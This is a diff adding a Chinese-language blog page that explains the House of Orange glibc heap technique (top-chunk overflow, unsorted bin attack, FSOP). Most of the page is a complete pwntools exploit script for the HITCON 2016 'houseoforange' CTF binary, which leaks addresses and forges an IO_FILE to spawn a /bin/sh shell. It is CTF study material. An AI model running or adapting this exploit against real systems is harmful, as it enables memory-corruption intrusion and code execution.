@@ -1,0 +1,111 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>house of orange(欧润吉)</title>
+</head>
+<body>
+<b>house of orange(欧润吉)</b><br>
+<small>2025-05-08</small>
+<hr>
+<p>通过溢出修改top_chunk的size从而申请比修改后的size更大的chunk来触发sys_malloc，从而把原来的top_chunk给free掉 </p>
+<p>然后就可以泄露LIBC地址和堆地址了</p>
+<p>unsortedbin attack 已经在新版本libc被修复了 </p>
+<pre><code>victim = unsorted_chunks(av)-&gt;bk;  // 获取最后一个 chunk
+bck = victim-&gt;bk;                 // 获取 victim 的 bk
+unsorted_chunks(av)-&gt;bk = bck;    // 将 unsorted bin 的 bk 指向 victim 的 bk
+bck-&gt;fd = unsorted_chunks(av);    // 关键操作：将 victim-&gt;bk-&gt;fd 设置为 unsorted bin 头 </code></pre>
+
+<p>我们可以控制最后一个chunk的bk</p>
+<p>因为这个攻击是利用了 往 最后一个chunk 的 bk 的fd (bk+0x10)写入东西</p>
+<p>那么只要控制bk减少0x10 就可以往我们指定的target_address 写入 main_arena+96 或者+88 (一个很大的值)</p>
+<br><b><a href="#FSOP"></a>FSOP:</b><br>
+<p>FSOP的核心是去篡改_IO_list_all和_chain，来劫持IO_FILE结构体。让IO_FILE结构体落在我们可控的内存上。然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow</p>
+<p>主要就是为了控制_IO_list_all 然后控制vtable 或者chain</p>
+<br><b><a href="#houseoforange-hitcon-2016"></a>houseoforange_hitcon_2016</b><br>
+<pre><code>from pwn import *
+from LibcSearcher import *
+#from LibcSearcher import *
+context.log_level = &#x27;debug&#x27;
+context.arch = &#x27;amd64&#x27;
+#io = remote(&quot;node5.buuoj.cn&quot;,29087)
+io = process(&quot;./orange&quot;)
+e = ELF(&#x27;./orange&#x27;)
+libc = ELF(&#x27;/home/rick/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)
+
+def get_addr():
+	return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))
+
+def bug():
+    attach(io)
+
+s       = lambda data               :io.send(data)
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r       = lambda num                :io.recv(num)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+itr     = lambda                    :io.interactive()
+uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))
+uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))
+ls      = lambda data               :log.success(data)
+dlog     = lambda name,data         :log.success(f&quot;get &#123;name&#125;=&gt;&quot;+hex(data))
+
+def add():
+    sla(b&quot;Your choice : &quot;,str(1))
+
+def add(size,content):
+    sla(&#x27;Your choice : &#x27;,str(1))
+    sla(&#x27;Length of name :&#x27;,str(size))
+    sa(&#x27;Name :&#x27;,content)
+    sla(&#x27;Price of Orange:&#x27;,str(1))
+    sla(&#x27;Color of Orange:&#x27;,str(2))
+
+def edit(size,content):
+    sla(&#x27;Your choice : &#x27;,str(3))
+    sla(&#x27;Length of name :&#x27;,str(size))
+    sa(&#x27;Name:&#x27;,content)
+    sla(&#x27;Price of Orange:&#x27;,str(1))
+    sla(&#x27;Color of Orange:&#x27;,str(2))
+
+def delete(index):
+    sla(&#x27;4.show\n&#x27;,str(2))
+    sla(&#x27;index:\n&#x27;,str(index))
+    
+def show():
+    sla(&#x27;Your choice : &#x27;,str(2))
+
+add(0x10,b&#x27;a&#x27;)
+edit(0x40,b&#x27;a&#x27;*0x10+p64(0)+p64(0x21)+b&#x27;a&#x27;*0x10+p64(0)+p64(0xfa1)) # modify top_chunk
+add(0x1000,b&#x27;a&#x27;)
+add(0x500,b&#x27;a&#x27;) # cut the free chunk 
+show()
+ru(&#x27;Name of house : &#x27;)
+leak_main_arena = uu64(r(6))
+dlog(&quot;main_arena&quot;,leak_main_arena)
+libc_base = leak_main_arena -0x5e9 - 88 - 0x10 - libc.sym[&quot;__malloc_hook&quot;]
+dlog(&quot;libc_base&quot;,libc_base)
+io_2_1_list_all = libc_base + libc.sym[&quot;_IO_list_all&quot;]
+system_addr = libc_base + libc.sym[&quot;system&quot;]
+dlog(&quot;list_all&quot;,io_2_1_list_all)
+edit(0x10,b&#x27;a&#x27;*0x10)
+show()
+ru(b&#x27;a&#x27;*0x10)
+leak_heap_addr = uu64(r(6))
+dlog(&quot;heap_address&quot;,leak_heap_addr)
+payload = b&#x27;a&#x27;*0x500 + p64(0) +p64(0x21)+b&#x27;a&#x27;*0x10
+payload+=b&#x27;/bin/sh\x00&#x27;+p64(0x61)+p64(0)+p64(io_2_1_list_all-0x10)#unsorted bin attack
+payload+=p64(0)+p64(1)
+payload+=p64(0)*7
+payload+=p64(leak_heap_addr+0x530)+p64(0)*10
+payload+=p64(0)*3+p64(leak_heap_addr+0x610)+p64(system_addr)*8
+edit(len(payload),payload)
+#bug()
+sla(&#x27;Your choice : &#x27;,str(1))
+
+io.interactive()</code></pre>
+
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
